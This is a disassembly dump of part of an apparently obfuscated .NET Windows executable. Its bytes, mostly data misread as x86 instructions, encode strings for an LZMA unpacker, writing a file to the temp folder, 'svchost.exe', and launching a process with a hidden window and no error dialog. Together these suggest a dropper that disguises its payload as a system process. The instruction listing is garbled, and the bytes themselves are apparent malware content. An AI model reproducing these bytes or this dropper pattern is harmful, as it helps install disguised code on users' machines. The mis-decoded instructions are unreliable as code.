  4071dd:	00 5a 04             	add    %bl,0x4(%edx)
  4071e0:	0a 00                	or     (%eax),%al
  4071e2:	49                   	dec    %ecx
  4071e3:	01 10                	add    %edx,(%eax)
  4071e5:	06                   	push   %es
  4071e6:	89 03                	mov    %eax,(%ebx)
  4071e8:	21 00                	and    %eax,(%eax)
  4071ea:	32 01                	xor    (%ecx),%al
  4071ec:	b9 03 51 01 77       	mov    $0x77015103,%ecx
  4071f1:	03 2a                	add    (%edx),%ebp
  4071f3:	01 51 01             	add    %edx,0x1(%ecx)
  4071f6:	00 01                	add    %al,(%ecx)
  4071f8:	2e 01 51 01          	add    %edx,%cs:0x1(%ecx)
  4071fc:	00 01                	add    %al,(%ecx)
  4071fe:	35 01 59 01 70       	xor    $0x70015901,%eax
  407203:	05 3b 01 61 01       	add    $0x161013b,%eax
  407208:	61                   	popa
  407209:	06                   	push   %es
  40720a:	40                   	inc    %eax
  40720b:	01 11                	add    %edx,(%ecx)
  40720d:	01 77 05             	add    %esi,0x5(%edi)
  407210:	46                   	inc    %esi
  407211:	01 31                	add    %esi,(%ecx)
  407213:	00 5a 04             	add    %bl,0x4(%edx)
  407216:	0a 00                	or     (%eax),%al
  407218:	31 00                	xor    %eax,(%eax)
  40721a:	f3 00 74 01 31       	repz add %dh,0x31(%ecx,%eax,1)
  40721f:	00 62 05             	add    %ah,0x5(%edx)
  407222:	74 01                	je     0x407225
  407224:	31 00                	xor    %eax,(%eax)
  407226:	c9                   	leave
  407227:	02 f5                	add    %ch,%dh
  407229:	01 31                	add    %esi,(%ecx)
  40722b:	00 fd                	add    %bh,%ch
  40722d:	05 f5 01 31 00       	add    $0x3101f5,%eax
  407232:	b9 00 da 03 31       	mov    $0x3103da00,%ecx
  407237:	00 d6                	add    %dl,%dh
  407239:	05 f5 01 31 00       	add    $0x3101f5,%eax
  40723e:	40                   	inc    %eax
  40723f:	04 f5                	add    $0xf5,%al
  407241:	01 31                	add    %esi,(%ecx)
  407243:	00 62 03             	add    %ah,0x3(%edx)
  407246:	f5                   	cmc
  407247:	01 41 00             	add    %eax,0x0(%ecx)
  40724a:	c8 05 67 01          	enter  $0x6705,$0x1
  40724e:	41                   	inc    %ecx
  40724f:	00 bc 05 0a 00 49 00 	add    %bh,0x49000a(%ebp,%eax,1)
  407256:	5a                   	pop    %edx
  407257:	04 0a                	add    $0xa,%al
  407259:	00 27                	add    %ah,(%edi)
  40725b:	00 0b                	add    %cl,(%ebx)
  40725d:	00 0e                	add    %cl,(%esi)
  40725f:	00 27                	add    %ah,(%edi)
  407261:	00 7a 02             	add    %bh,0x2(%edx)
  407264:	13 00                	adc    (%eax),%eax
  407266:	2e 00 13             	add    %dl,%cs:(%ebx)
  407269:	00 79 01             	add    %bh,0x1(%ecx)
  40726c:	2e 00 1b             	add    %bl,%cs:(%ebx)
  40726f:	00 82 01 2e 00 23    	add    %al,0x23002e01(%edx)
  407275:	00 a7 01 2e 00 2b    	add    %ah,0x2b002e01(%edi)
  40727b:	00 b0 01 2e 00 33    	add    %dh,0x33002e01(%eax)
  407281:	00 bd 01 2e 00 3b    	add    %bh,0x3b002e01(%ebp)
  407287:	00 bd 01 2e 00 43    	add    %bh,0x43002e01(%ebp)
  40728d:	00 c3                	add    %al,%bl
  40728f:	01 2e                	add    %ebp,(%esi)
  407291:	00 4b 00             	add    %cl,0x0(%ebx)
  407294:	b0 01                	mov    $0x1,%al
  407296:	2e 00 53 00          	add    %dl,%cs:0x0(%ebx)
  40729a:	d3 01                	roll   %cl,(%ecx)
  40729c:	2e 00 5b 00          	add    %bl,%cs:0x0(%ebx)
  4072a0:	bd 01 2e 00 63       	mov    $0x63002e01,%ebp
  4072a5:	00 bd 01 2e 00 6b    	add    %bh,0x6b002e01(%ebp)
  4072ab:	00 fa                	add    %bh,%dl
  4072ad:	01 2e                	add    %ebp,(%esi)
  4072af:	00 73 00             	add    %dh,0x0(%ebx)
  4072b2:	24 02                	and    $0x2,%al
  4072b4:	2e 00 7b 00          	add    %bh,%cs:0x0(%ebx)
  4072b8:	31 02                	xor    %eax,(%edx)
  4072ba:	ff                   	(bad)
  4072bb:	7f ff                	jg     0x4072bc
  4072bd:	7f ff                	jg     0x4072be
  4072bf:	7f 00                	jg     0x4072c1
  4072c1:	00 80 00 00 00 0b    	add    %al,0xb000000(%eax)
  4072c7:	00 7b 02             	add    %bh,0x2(%ebx)
  4072ca:	7f 02                	jg     0x4072ce
  4072cc:	b0 02                	mov    $0x2,%al
  4072ce:	cc                   	int3
  4072cf:	02 21                	add    (%ecx),%ah
  4072d1:	03 68 03             	add    0x3(%eax),%ebp
  4072d4:	6d                   	insl   (%dx),%es:(%edi)
  4072d5:	03 73 03             	add    0x3(%ebx),%esi
  4072d8:	7b 03                	jnp    0x4072dd
  4072da:	80 03 8f             	addb   $0x8f,(%ebx)
  4072dd:	03 96 03 aa 03 b3    	add    -0x4cfc55fd(%esi),%edx
  4072e3:	03 c1                	add    %ecx,%eax
  4072e5:	03 cf                	add    %edi,%ecx
  4072e7:	03 96 03 fb 02 00    	add    0x2fb03(%esi),%edx
  4072ed:	01 13                	add    %edx,(%ebx)
  4072ef:	00 94 05 01 00 00 20 	add    %dl,0x20000001(%ebp,%eax,1)
  4072f6:	00 00                	add    %al,(%eax)
  4072f8:	02 00                	add    (%eax),%al
  4072fa:	ca 69 4d             	lret   $0x4d69
  4072fd:	d4 5a                	aam    $0x5a
  4072ff:	46                   	inc    %esi
  407300:	51                   	push   %ecx
  407301:	e7 8f                	out    %eax,$0x8f
  407303:	09 80 a0 ac 1d e8    	or     %eax,-0x17e25360(%eax)
  407309:	89 fa                	mov    %edi,%edx
  40730b:	9e                   	sahf
  40730c:	44                   	inc    %esp
  40730d:	3b 93 cb 5f de dc    	cmp    -0x2321a035(%ebx),%edx
  407313:	b4 ec                	mov    $0xec,%ah
  407315:	20 62 c7             	and    %ah,-0x39(%edx)
  407318:	00 28                	add    %ch,(%eax)
  40731a:	5a                   	pop    %edx
  40731b:	e6 38                	out    %al,$0x38
  40731d:	25 c1 74 51 68       	and    $0x685174c1,%eax
  407322:	2f                   	das
  407323:	60                   	pusha
  407324:	9c                   	pushf
  407325:	69 f7 5c cb 53 23    	imul   $0x2353cb5c,%edi,%esi
  40732b:	70 65                	jo     0x407392
  40732d:	00 a0 ff 28 86 0c    	add    %ah,0xc8628ff(%eax)
  407333:	50                   	push   %eax
  407334:	1c cc                	sbb    $0xcc,%al
  407336:	e1 ce                	loope  0x407306
  407338:	1e                   	push   %ds
  407339:	85 fe                	test   %edi,%esi
  40733b:	ee                   	out    %al,(%dx)
  40733c:	f9                   	stc
  40733d:	d0 28                	shrb   $1,(%eax)
  40733f:	d9 8d 56 b0 0d 14    	(bad) 0x140db056(%ebp)
  407345:	28 f8                	sub    %bh,%al
  407347:	77 f4                	ja     0x40733d
  407349:	84 87 32 68 38 dc    	test   %al,-0x23c797ce(%edi)
  40734f:	0a d9                	or     %cl,%bl
  407351:	ab                   	stos   %eax,%es:(%edi)
  407352:	3c 36                	cmp    $0x36,%al
  407354:	15 83 fb b0 75       	adc    $0x75b0fb83,%eax
  407359:	1e                   	push   %ds
  40735a:	7a 4d                	jp     0x4073a9
  40735c:	a2 f8 5b 9c d0       	mov    %al,0xd09c5bf8
  407361:	0c dd                	or     $0xdd,%al
  407363:	ee                   	out    %al,(%dx)
  407364:	67 06                	addr16 push %es
  407366:	c7                   	(bad)
  407367:	cd 1e                	int    $0x1e
  407369:	e7 f4                	out    %eax,$0xf4
  40736b:	b4 6e                	mov    $0x6e,%ah
  40736d:	99                   	cltd
  40736e:	64 ca d8 21          	fs lret $0x21d8
  407372:	d9 ce                	fxch   %st(6)
  407374:	3d 20 d3 f4 eb       	cmp    $0xebf4d320,%eax
  407379:	5e                   	pop    %esi
  40737a:	04 80                	add    $0x80,%al
  40737c:	00 00                	add    %al,(%eax)
  40737e:	01 00                	add    %eax,(%eax)
	...
  40738c:	ce                   	into
  40738d:	05 00 00 00 00       	add    $0x0,%eax
	...
  4073a2:	ff                   	(bad)
  4073a3:	7f 00                	jg     0x4073a5
  4073a5:	00 04 00             	add    %al,(%eax,%eax,1)
	...
  4073b0:	00 00                	add    %al,(%eax)
  4073b2:	01 00                	add    %eax,(%eax)
  4073b4:	40                   	inc    %eax
  4073b5:	00 00                	add    %al,(%eax)
  4073b7:	00 00                	add    %al,(%eax)
  4073b9:	00 04 00             	add    %al,(%eax,%eax,1)
	...
  4073c4:	00 00                	add    %al,(%eax)
  4073c6:	01 00                	add    %eax,(%eax)
  4073c8:	ca 03 00             	lret   $0x3
  4073cb:	00 00                	add    %al,(%eax)
  4073cd:	00 02                	add    %al,(%edx)
  4073cf:	00 01                	add    %al,(%ecx)
  4073d1:	00 03                	add    %al,(%ebx)
  4073d3:	00 01                	add    %al,(%ecx)
  4073d5:	00 04 00             	add    %al,(%eax,%eax,1)
  4073d8:	01 00                	add    %eax,(%eax)
  4073da:	05 00 01 00 06       	add    $0x6000100,%eax
  4073df:	00 05 00 07 00 05    	add    %al,0x5000700
  4073e5:	00 08                	add    %cl,(%eax)
  4073e7:	00 07                	add    %al,(%edi)
  4073e9:	00 09                	add    %cl,(%ecx)
  4073eb:	00 01                	add    %al,(%ecx)
  4073ed:	00 0a                	add    %cl,(%edx)
  4073ef:	00 01                	add    %al,(%ecx)
  4073f1:	00 0b                	add    %cl,(%ebx)
  4073f3:	00 01                	add    %al,(%ecx)
  4073f5:	00 00                	add    %al,(%eax)
  4073f7:	00 00                	add    %al,(%eax)
  4073f9:	00 09                	add    %cl,(%ecx)
  4073fb:	00 01                	add    %al,(%ecx)
  4073fd:	00 00                	add    %al,(%eax)
  4073ff:	00 00                	add    %al,(%eax)
  407401:	00 0b                	add    %cl,(%ebx)
  407403:	00 01                	add    %al,(%ecx)
  407405:	00 00                	add    %al,(%eax)
  407407:	00 00                	add    %al,(%eax)
  407409:	00 0d 00 01 00 00    	add    %cl,0x100
  40740f:	00 00                	add    %al,(%eax)
  407411:	00 0f                	add    %cl,(%edi)
  407413:	00 01                	add    %al,(%ecx)
  407415:	00 00                	add    %al,(%eax)
  407417:	00 00                	add    %al,(%eax)
  407419:	00 11                	add    %dl,(%ecx)
  40741b:	00 01                	add    %al,(%ecx)
  40741d:	00 10                	add    %dl,(%eax)
  40741f:	00 cb                	add    %cl,%bl
  407421:	03 08                	add    (%eax),%ecx
  407423:	00 cb                	add    %cl,%bl
  407425:	03 0a                	add    (%edx),%ecx
  407427:	00 cb                	add    %cl,%bl
  407429:	03 0e                	add    (%esi),%ecx
  40742b:	00 cb                	add    %cl,%bl
  40742d:	03 00                	add    (%eax),%eax
  40742f:	00 00                	add    %al,(%eax)
  407431:	2d 00 55 49 6e       	sub    $0x6e495500,%eax
  407436:	74 33                	je     0x40746b
  407438:	32 00                	xor    (%eax),%al
  40743a:	54                   	push   %esp
  40743b:	6f                   	outsl  %ds:(%esi),(%dx)
  40743c:	49                   	dec    %ecx
  40743d:	6e                   	outsb  %ds:(%esi),(%dx)
  40743e:	74 33                	je     0x407473
  407440:	32 00                	xor    (%eax),%al
  407442:	67 65 74 5f          	addr16 gs je 0x4074a5
  407446:	55                   	push   %ebp
  407447:	54                   	push   %esp
  407448:	46                   	inc    %esi
  407449:	38 00                	cmp    %al,(%eax)
  40744b:	3c 4d                	cmp    $0x4d,%al
  40744d:	6f                   	outsl  %ds:(%esi),(%dx)
  40744e:	64 75 6c             	fs jne 0x4074bd
  407451:	65 3e 00 47 65       	gs add %al,%ds:0x65(%edi)
  407456:	74 48                	je     0x4074a0
  407458:	49                   	dec    %ecx
  407459:	4e                   	dec    %esi
  40745a:	53                   	push   %ebx
  40745b:	54                   	push   %esp
  40745c:	41                   	inc    %ecx
  40745d:	4e                   	dec    %esi
  40745e:	43                   	inc    %ebx
  40745f:	45                   	inc    %ebp
  407460:	00 53 79             	add    %dl,0x79(%ebx)
  407463:	73 74                	jae    0x4074d9
  407465:	65 6d                	gs insl (%dx),%es:(%edi)
  407467:	2e 49                	cs dec %ecx
  407469:	4f                   	dec    %edi
  40746a:	00 64 61 74          	add    %ah,0x74(%ecx,%eiz,2)
  40746e:	61                   	popa
  40746f:	00 6d 73             	add    %ch,0x73(%ebp)
  407472:	63 6f 72             	arpl   %ebp,0x72(%edi)
  407475:	6c                   	insb   (%dx),%es:(%edi)
  407476:	69 62 00 70 62 00 6c 	imul   $0x6c006270,0x0(%edx),%esp
  40747d:	63 00                	arpl   %eax,(%eax)
  40747f:	52                   	push   %edx
  407480:	65 61                	gs popa
  407482:	64 00 73 6f          	add    %dh,%fs:0x6f(%ebx)
  407486:	6c                   	insb   (%dx),%es:(%edi)
  407487:	69 64 00 64 69 73 74 	imul   $0x61747369,0x64(%eax,%eax,1),%esp
  40748e:	61 
  40748f:	6e                   	outsb  %ds:(%esi),(%dx)
  407490:	63 65 00             	arpl   %esp,0x0(%ebp)
  407493:	43                   	inc    %ebx
  407494:	72 65                	jb     0x4074fb
  407496:	61                   	popa
  407497:	74 65                	je     0x4074fe
  407499:	49                   	dec    %ecx
  40749a:	6e                   	outsb  %ds:(%esi),(%dx)
  40749b:	73 74                	jae    0x407511
  40749d:	61                   	popa
  40749e:	6e                   	outsb  %ds:(%esi),(%dx)
  40749f:	63 65 00             	arpl   %esp,0x0(%ebp)
  4074a2:	52                   	push   %edx
  4074a3:	75 6e                	jne    0x407513
  4074a5:	74 69                	je     0x407510
  4074a7:	6d                   	insl   (%dx),%es:(%edi)
  4074a8:	65 46                	gs inc %esi
  4074aa:	69 65 6c 64 48 61 6e 	imul   $0x6e614864,0x6c(%ebp),%esp
  4074b1:	64 6c                	fs insb (%dx),%es:(%edi)
  4074b3:	65 00 52 75          	add    %dl,%gs:0x75(%edx)
  4074b7:	6e                   	outsb  %ds:(%esi),(%dx)
  4074b8:	74 69                	je     0x407523
  4074ba:	6d                   	insl   (%dx),%es:(%edi)
  4074bb:	65 54                	gs push %esp
  4074bd:	79 70                	jns    0x40752f
  4074bf:	65 48                	gs dec %eax
  4074c1:	61                   	popa
  4074c2:	6e                   	outsb  %ds:(%esi),(%dx)
  4074c3:	64 6c                	fs insb (%dx),%es:(%edi)
  4074c5:	65 00 47 65          	add    %al,%gs:0x65(%edi)
  4074c9:	74 54                	je     0x40751f
  4074cb:	79 70                	jns    0x40753d
  4074cd:	65 46                	gs inc %esi
  4074cf:	72 6f                	jb     0x407540
  4074d1:	6d                   	insl   (%dx),%es:(%edi)
  4074d2:	48                   	dec    %eax
  4074d3:	61                   	popa
  4074d4:	6e                   	outsb  %ds:(%esi),(%dx)
  4074d5:	64 6c                	fs insb (%dx),%es:(%edi)
  4074d7:	65 00 46 69          	add    %al,%gs:0x69(%esi)
  4074db:	6c                   	insb   (%dx),%es:(%edi)
  4074dc:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  4074e0:	74 5f                	je     0x407541
  4074e2:	4d                   	dec    %ebp
  4074e3:	6f                   	outsl  %ds:(%esi),(%dx)
  4074e4:	64 75 6c             	fs jne 0x407553
  4074e7:	65 00 73 65          	add    %dh,%gs:0x65(%ebx)
  4074eb:	74 5f                	je     0x40754c
  4074ed:	57                   	push   %edi
  4074ee:	69 6e 64 6f 77 53 74 	imul   $0x7453776f,0x64(%esi),%ebp
  4074f5:	79 6c                	jns    0x407563
  4074f7:	65 00 50 72          	add    %dl,%gs:0x72(%eax)
  4074fb:	6f                   	outsl  %ds:(%esi),(%dx)
  4074fc:	63 65 73             	arpl   %esp,0x73(%ebp)
  4074ff:	73 57                	jae    0x407558
  407501:	69 6e 64 6f 77 53 74 	imul   $0x7453776f,0x64(%esi),%ebp
  407508:	79 6c                	jns    0x407576
  40750a:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  40750e:	74 5f                	je     0x40756f
  407510:	46                   	inc    %esi
  407511:	75 6c                	jne    0x40757f
  407513:	6c                   	insb   (%dx),%es:(%edi)
  407514:	79 51                	jns    0x407567
  407516:	75 61                	jne    0x407579
  407518:	6c                   	insb   (%dx),%es:(%edi)
  407519:	69 66 69 65 64 4e 61 	imul   $0x614e6465,0x69(%esi),%esp
  407520:	6d                   	insl   (%dx),%es:(%edi)
  407521:	65 00 73 65          	add    %dh,%gs:0x65(%ebx)
  407525:	74 5f                	je     0x407586
  407527:	46                   	inc    %esi
  407528:	69 6c 65 4e 61 6d 65 	imul   $0x656d61,0x4e(%ebp,%eiz,2),%ebp
  40752f:	00 
  407530:	43                   	inc    %ebx
  407531:	6f                   	outsl  %ds:(%esi),(%dx)
  407532:	6d                   	insl   (%dx),%es:(%edi)
  407533:	62 69 6e             	bound  %ebp,0x6e(%ecx)
  407536:	65 00 56 61          	add    %dl,%gs:0x61(%esi)
  40753a:	6c                   	insb   (%dx),%es:(%edi)
  40753b:	75 65                	jne    0x4075a2
  40753d:	54                   	push   %esp
  40753e:	79 70                	jns    0x4075b0
  407540:	65 00 47 65          	add    %al,%gs:0x65(%edi)
  407544:	74 45                	je     0x40758b
  407546:	6c                   	insb   (%dx),%es:(%edi)
  407547:	65 6d                	gs insl (%dx),%es:(%edi)
  407549:	65 6e                	outsb  %gs:(%esi),(%dx)
  40754b:	74 54                	je     0x4075a1
  40754d:	79 70                	jns    0x4075bf
  40754f:	65 00 52 65          	add    %dl,%gs:0x65(%edx)
  407553:	76 65                	jbe    0x4075ba
  407555:	72 73                	jb     0x4075ca
  407557:	65 00 70 6f          	add    %dh,%gs:0x6f(%eax)
  40755b:	73 53                	jae    0x4075b0
  40755d:	74 61                	je     0x4075c0
  40755f:	74 65                	je     0x4075c6
  407561:	00 57 72             	add    %dl,0x72(%edi)
  407564:	69 74 65 00 47 75 69 	imul   $0x64697547,0x0(%ebp,%eiz,2),%esi
  40756b:	64 
  40756c:	41                   	inc    %ecx
  40756d:	74 74                	je     0x4075e3
  40756f:	72 69                	jb     0x4075da
  407571:	62 75 74             	bound  %esi,0x74(%ebp)
  407574:	65 00 44 65 62       	add    %al,%gs:0x62(%ebp,%eiz,2)
  407579:	75 67                	jne    0x4075e2
  40757b:	67 61                	addr16 popa
  40757d:	62 6c 65 41          	bound  %ebp,0x41(%ebp,%eiz,2)
  407581:	74 74                	je     0x4075f7
  407583:	72 69                	jb     0x4075ee
  407585:	62 75 74             	bound  %esi,0x74(%ebp)
  407588:	65 00 43 6f          	add    %al,%gs:0x6f(%ebx)
  40758c:	6d                   	insl   (%dx),%es:(%edi)
  40758d:	56                   	push   %esi
  40758e:	69 73 69 62 6c 65 41 	imul   $0x41656c62,0x69(%ebx),%esi
  407595:	74 74                	je     0x40760b
  407597:	72 69                	jb     0x407602
  407599:	62 75 74             	bound  %esi,0x74(%ebp)
  40759c:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  4075a0:	73 65                	jae    0x407607
  4075a2:	6d                   	insl   (%dx),%es:(%edi)
  4075a3:	62 6c 79 54          	bound  %ebp,0x54(%ecx,%edi,2)
  4075a7:	69 74 6c 65 41 74 74 	imul   $0x72747441,0x65(%esp,%ebp,2),%esi
  4075ae:	72 
  4075af:	69 62 75 74 65 00 41 	imul   $0x41006574,0x75(%edx),%esp
  4075b6:	73 73                	jae    0x40762b
  4075b8:	65 6d                	gs insl (%dx),%es:(%edi)
  4075ba:	62 6c 79 54          	bound  %ebp,0x54(%ecx,%edi,2)
  4075be:	72 61                	jb     0x407621
  4075c0:	64 65 6d             	fs gs insl (%dx),%es:(%edi)
  4075c3:	61                   	popa
  4075c4:	72 6b                	jb     0x407631
  4075c6:	41                   	inc    %ecx
  4075c7:	74 74                	je     0x40763d
  4075c9:	72 69                	jb     0x407634
  4075cb:	62 75 74             	bound  %esi,0x74(%ebp)
  4075ce:	65 00 54 61 72       	add    %dl,%gs:0x72(%ecx,%eiz,2)
  4075d3:	67 65 74 46          	addr16 gs je 0x40761d
  4075d7:	72 61                	jb     0x40763a
  4075d9:	6d                   	insl   (%dx),%es:(%edi)
  4075da:	65 77 6f             	gs ja  0x40764c
  4075dd:	72 6b                	jb     0x40764a
  4075df:	41                   	inc    %ecx
  4075e0:	74 74                	je     0x407656
  4075e2:	72 69                	jb     0x40764d
  4075e4:	62 75 74             	bound  %esi,0x74(%ebp)
  4075e7:	65 00 53 75          	add    %dl,%gs:0x75(%ebx)
  4075eb:	70 70                	jo     0x40765d
  4075ed:	72 65                	jb     0x407654
  4075ef:	73 73                	jae    0x407664
  4075f1:	49                   	dec    %ecx
  4075f2:	6c                   	insb   (%dx),%es:(%edi)
  4075f3:	64 61                	fs popa
  4075f5:	73 6d                	jae    0x407664
  4075f7:	41                   	inc    %ecx
  4075f8:	74 74                	je     0x40766e
  4075fa:	72 69                	jb     0x407665
  4075fc:	62 75 74             	bound  %esi,0x74(%ebp)
  4075ff:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  407603:	73 65                	jae    0x40766a
  407605:	6d                   	insl   (%dx),%es:(%edi)
  407606:	62 6c 79 46          	bound  %ebp,0x46(%ecx,%edi,2)
  40760a:	69 6c 65 56 65 72 73 	imul   $0x69737265,0x56(%ebp,%eiz,2),%ebp
  407611:	69 
  407612:	6f                   	outsl  %ds:(%esi),(%dx)
  407613:	6e                   	outsb  %ds:(%esi),(%dx)
  407614:	41                   	inc    %ecx
  407615:	74 74                	je     0x40768b
  407617:	72 69                	jb     0x407682
  407619:	62 75 74             	bound  %esi,0x74(%ebp)
  40761c:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  407620:	73 65                	jae    0x407687
  407622:	6d                   	insl   (%dx),%es:(%edi)
  407623:	62 6c 79 43          	bound  %ebp,0x43(%ecx,%edi,2)
  407627:	6f                   	outsl  %ds:(%esi),(%dx)
  407628:	6e                   	outsb  %ds:(%esi),(%dx)
  407629:	66 69 67 75 72 61    	imul   $0x6172,0x75(%edi),%sp
  40762f:	74 69                	je     0x40769a
  407631:	6f                   	outsl  %ds:(%esi),(%dx)
  407632:	6e                   	outsb  %ds:(%esi),(%dx)
  407633:	41                   	inc    %ecx
  407634:	74 74                	je     0x4076aa
  407636:	72 69                	jb     0x4076a1
  407638:	62 75 74             	bound  %esi,0x74(%ebp)
  40763b:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  40763f:	73 65                	jae    0x4076a6
  407641:	6d                   	insl   (%dx),%es:(%edi)
  407642:	62 6c 79 44          	bound  %ebp,0x44(%ecx,%edi,2)
  407646:	65 73 63             	gs jae 0x4076ac
  407649:	72 69                	jb     0x4076b4
  40764b:	70 74                	jo     0x4076c1
  40764d:	69 6f 6e 41 74 74 72 	imul   $0x72747441,0x6e(%edi),%ebp
  407654:	69 62 75 74 65 00 43 	imul   $0x43006574,0x75(%edx),%esp
  40765b:	6f                   	outsl  %ds:(%esi),(%dx)
  40765c:	6d                   	insl   (%dx),%es:(%edi)
  40765d:	70 69                	jo     0x4076c8
  40765f:	6c                   	insb   (%dx),%es:(%edi)
  407660:	61                   	popa
  407661:	74 69                	je     0x4076cc
  407663:	6f                   	outsl  %ds:(%esi),(%dx)
  407664:	6e                   	outsb  %ds:(%esi),(%dx)
  407665:	52                   	push   %edx
  407666:	65 6c                	gs insb (%dx),%es:(%edi)
  407668:	61                   	popa
  407669:	78 61                	js     0x4076cc
  40766b:	74 69                	je     0x4076d6
  40766d:	6f                   	outsl  %ds:(%esi),(%dx)
  40766e:	6e                   	outsb  %ds:(%esi),(%dx)
  40766f:	73 41                	jae    0x4076b2
  407671:	74 74                	je     0x4076e7
  407673:	72 69                	jb     0x4076de
  407675:	62 75 74             	bound  %esi,0x74(%ebp)
  407678:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  40767c:	73 65                	jae    0x4076e3
  40767e:	6d                   	insl   (%dx),%es:(%edi)
  40767f:	62 6c 79 50          	bound  %ebp,0x50(%ecx,%edi,2)
  407683:	72 6f                	jb     0x4076f4
  407685:	64 75 63             	fs jne 0x4076eb
  407688:	74 41                	je     0x4076cb
  40768a:	74 74                	je     0x407700
  40768c:	72 69                	jb     0x4076f7
  40768e:	62 75 74             	bound  %esi,0x74(%ebp)
  407691:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  407695:	73 65                	jae    0x4076fc
  407697:	6d                   	insl   (%dx),%es:(%edi)
  407698:	62 6c 79 43          	bound  %ebp,0x43(%ecx,%edi,2)
  40769c:	6f                   	outsl  %ds:(%esi),(%dx)
  40769d:	70 79                	jo     0x407718
  40769f:	72 69                	jb     0x40770a
  4076a1:	67 68 74 41 74 74    	addr16 push $0x74744174
  4076a7:	72 69                	jb     0x407712
  4076a9:	62 75 74             	bound  %esi,0x74(%ebp)
  4076ac:	65 00 43 6f          	add    %al,%gs:0x6f(%ebx)
  4076b0:	6e                   	outsb  %ds:(%esi),(%dx)
  4076b1:	66 75 73             	data16 jne 0x407727
  4076b4:	65 64 42             	gs fs inc %edx
  4076b7:	79 41                	jns    0x4076fa
  4076b9:	74 74                	je     0x40772f
  4076bb:	72 69                	jb     0x407726
  4076bd:	62 75 74             	bound  %esi,0x74(%ebp)
  4076c0:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  4076c4:	73 65                	jae    0x40772b
  4076c6:	6d                   	insl   (%dx),%es:(%edi)
  4076c7:	62 6c 79 43          	bound  %ebp,0x43(%ecx,%edi,2)
  4076cb:	6f                   	outsl  %ds:(%esi),(%dx)
  4076cc:	6d                   	insl   (%dx),%es:(%edi)
  4076cd:	70 61                	jo     0x407730
  4076cf:	6e                   	outsb  %ds:(%esi),(%dx)
  4076d0:	79 41                	jns    0x407713
  4076d2:	74 74                	je     0x407748
  4076d4:	72 69                	jb     0x40773f
  4076d6:	62 75 74             	bound  %esi,0x74(%ebp)
  4076d9:	65 00 52 75          	add    %dl,%gs:0x75(%edx)
  4076dd:	6e                   	outsb  %ds:(%esi),(%dx)
  4076de:	74 69                	je     0x407749
  4076e0:	6d                   	insl   (%dx),%es:(%edi)
  4076e1:	65 43                	gs inc %ebx
  4076e3:	6f                   	outsl  %ds:(%esi),(%dx)
  4076e4:	6d                   	insl   (%dx),%es:(%edi)
  4076e5:	70 61                	jo     0x407748
  4076e7:	74 69                	je     0x407752
  4076e9:	62 69 6c             	bound  %ebp,0x6c(%ecx)
  4076ec:	69 74 79 41 74 74 72 	imul   $0x69727474,0x41(%ecx,%edi,2),%esi
  4076f3:	69 
  4076f4:	62 75 74             	bound  %esi,0x74(%ebp)
  4076f7:	65 00 73 65          	add    %dh,%gs:0x65(%ebx)
  4076fb:	74 5f                	je     0x40775c
  4076fd:	55                   	push   %ebp
  4076fe:	73 65                	jae    0x407765
  407700:	53                   	push   %ebx
  407701:	68 65 6c 6c 45       	push   $0x456c6c65
  407706:	78 65                	js     0x40776d
  407708:	63 75 74             	arpl   %esi,0x74(%ebp)
  40770b:	65 00 52 65          	add    %dl,%gs:0x65(%edx)
  40770f:	61                   	popa
  407710:	64 42                	fs inc %edx
  407712:	79 74                	jns    0x407788
  407714:	65 00 6d 61          	add    %ch,%gs:0x61(%ebp)
  407718:	74 63                	je     0x40777d
  40771a:	68 42 79 74 65       	push   $0x65747942
  40771f:	00 70 72             	add    %dh,0x72(%eax)
  407722:	65 76 42             	gs jbe 0x407767
  407725:	79 74                	jns    0x40779b
  407727:	65 00 73 76          	add    %dh,%gs:0x76(%ebx)
  40772b:	63 68 6f             	arpl   %ebp,0x6f(%eax)
  40772e:	73 74                	jae    0x4077a4
  407730:	2e 65 78 65          	cs js,pn 0x407799
  407734:	00 69 6e             	add    %ch,0x6e(%ecx)
  407737:	53                   	push   %ebx
  407738:	69 7a 65 00 6f 75 74 	imul   $0x74756f00,0x65(%edx),%edi
  40773f:	53                   	push   %ebx
  407740:	69 7a 65 00 64 77 53 	imul   $0x53776400,0x65(%edx),%edi
  407747:	69 7a 65 00 77 69 6e 	imul   $0x6e697700,0x65(%edx),%edi
  40774e:	64 6f                	outsl  %fs:(%esi),(%dx)
  407750:	77 53                	ja     0x4077a5
  407752:	69 7a 65 00 64 69 63 	imul   $0x63696400,0x65(%edx),%edi
  407759:	74 69                	je     0x4077c4
  40775b:	6f                   	outsl  %ds:(%esi),(%dx)
  40775c:	6e                   	outsb  %ds:(%esi),(%dx)
  40775d:	61                   	popa
  40775e:	72 79                	jb     0x4077d9
  407760:	53                   	push   %ebx
  407761:	69 7a 65 00 45 6e 63 	imul   $0x636e4500,0x65(%edx),%edi
  407768:	6f                   	outsl  %ds:(%esi),(%dx)
  407769:	64 69 6e 67 00 53 79 	imul   $0x73795300,%fs:0x67(%esi),%ebp
  407770:	73 
  407771:	74 65                	je     0x4077d8
  407773:	6d                   	insl   (%dx),%es:(%edi)
  407774:	2e 52                	cs push %edx
  407776:	75 6e                	jne    0x4077e6
  407778:	74 69                	je     0x4077e3
  40777a:	6d                   	insl   (%dx),%es:(%edi)
  40777b:	65 2e 56             	gs cs push %esi
  40777e:	65 72 73             	gs jb  0x4077f4
  407781:	69 6f 6e 69 6e 67 00 	imul   $0x676e69,0x6e(%edi),%ebp
  407788:	47                   	inc    %edi
  407789:	65 74 53             	gs je  0x4077df
  40778c:	74 72                	je     0x407800
  40778e:	69 6e 67 00 73 65 74 	imul   $0x74657300,0x67(%esi),%ebp
  407795:	5f                   	pop    %edi
  407796:	45                   	inc    %ebp
  407797:	72 72                	jb     0x40780b
  407799:	6f                   	outsl  %ds:(%esi),(%dx)
  40779a:	72 44                	jb     0x4077e0
  40779c:	69 61 6c 6f 67 00 4d 	imul   $0x4d00676f,0x6c(%ecx),%esp
  4077a3:	61                   	popa
  4077a4:	74 68                	je     0x40780e
  4077a6:	00 47 65             	add    %al,0x65(%edi)
  4077a9:	74 54                	je     0x4077ff
  4077ab:	65 6d                	gs insl (%dx),%es:(%edi)
  4077ad:	70 50                	jo     0x4077ff
